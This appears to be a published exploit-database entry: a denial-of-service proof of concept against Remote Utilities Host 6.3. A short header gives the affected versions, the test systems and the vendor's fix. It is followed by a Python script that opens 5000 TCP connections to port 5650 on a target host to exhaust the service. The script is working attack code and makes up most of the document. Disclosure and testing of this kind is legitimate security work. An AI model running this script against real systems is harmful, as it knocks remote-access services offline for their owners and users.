# Exploit Title: Remote Utilities - Host 6.3 - Denial of Service
# Date: 2016-11-25
# Exploit Author: Peter Baris
# Vendor Homepage: www.remoteutilities.com 
# Software Link: http://saptech-erp.com.au/resources/executables/host6.3.zip
# Version: 6.3.0.6 - (other version are also affected below version 6.5 beta 3)
# Tested on: Windows 7 SP1 x64 and Windows Server 2008 R2 
# After the notification, the company released a fix in version 6.5 beta 3
# On Windows 7 - the software refuses connections after execution. 
# On Windows 2008 R2 it caused 100% CPU usage and occasional server crash when 1 core was assigned


#!/usr/bin/python
import socket
counter=0

while (counter <= 5000):	
	counter=counter+1
	print(counter)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('<host address>',5650))
	s.close()
